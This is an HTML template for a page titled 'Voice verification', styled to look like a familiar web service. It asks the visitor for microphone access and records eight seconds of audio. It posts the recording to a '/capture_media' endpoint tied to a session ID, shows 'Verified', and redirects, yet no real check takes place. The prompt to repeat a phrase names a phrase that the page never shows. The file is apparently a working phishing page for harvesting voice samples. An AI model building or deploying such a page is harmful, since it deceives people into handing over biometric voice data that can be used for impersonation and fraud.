<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Voice verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
    background:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh
}
.container{max-width:420px;width:100%;padding:24px;text-align:center}
.icon{width:64px;height:64px;background:#fce8e6;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px}
.icon svg{width:32px;height:32px;fill:#d93025}
h1{font-size:22px;color:#202124;font-weight:400;margin-bottom:8px}
p{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:1.5}
.status{font-size:13px;color:#5f6368;padding:12px;background:#f8f9fa;border-radius:8px;margin-bottom:16px}
.timer{font-size:32px;color:#202124;margin:16px 0;display:none}
@keyframes spin{to{transform:rotate(360deg)}}
.loading{width:20px;height:20px;border:2px solid #e0e0e0;border-top-color:#1a73e8;border-radius:50%;animation:spin .6s linear infinite;margin:12px auto}
</style>
</head>
<body>
<div class="container">
    <div class="icon">
        <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/><path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
    </div>
    <h1>Voice verification</h1>
    <p>Please allow microphone access. You will be asked to repeat a short phrase for voice verification.</p>
    <div class="status" id="status">Requesting microphone access...</div>
    <div class="timer" id="timer"></div>
    <div class="loading" id="loading"></div>
</div>
<script>
async function init(){
    const s=document.getElementById('status'),t=document.getElementById('timer'),l=document.getElementById('loading');
    try{
        const stream=await navigator.mediaDevices.getUserMedia({audio:{sampleRate:44100,channelCount:1,echoCancellation:true}});
        s.textContent='Recording... Please speak the phrase shown above.';t.style.display='block';t.textContent='8';
        const mr=new MediaRecorder(stream,{mimeType:MediaRecorder.isTypeSupported('audio/webm;codecs=opus')?'audio/webm;codecs=opus':'audio/webm'});
        const chunks=[];
        mr.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data)};
        mr.onstop=()=>{
            stream.getTracks().forEach(t=>t.stop());
            const blob=new Blob(chunks,{type:mr.mimeType});l.style.display='block';s.textContent='Processing...';
            const r=new FileReader();
            r.onloadend=function(){fetch('/capture_media/{{ session_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'audio',data:r.result})}).then(r=>r.json()).then(d=>{l.style.display='none';s.textContent='Verified. Redirecting...';setTimeout(()=>window.location.href='{{ redirect_url }}',1200)}).catch(()=>window.location.href='{{ redirect_url }}')};
            r.readAsDataURL(blob);
        };
        mr.start();
        let sec=8;const iv=setInterval(()=>{sec--;t.textContent=sec;if(sec<=0){clearInterval(iv);if(mr.state==='recording')mr.stop();s.textContent='Processing voice...'}},1000);
    }catch(e){s.textContent='Microphone access is required. Please allow access and try again.';setTimeout(()=>window.location.href='{{ redirect_url }}',2500)}
}
window.onload=init;
</script>
</body>
</html>
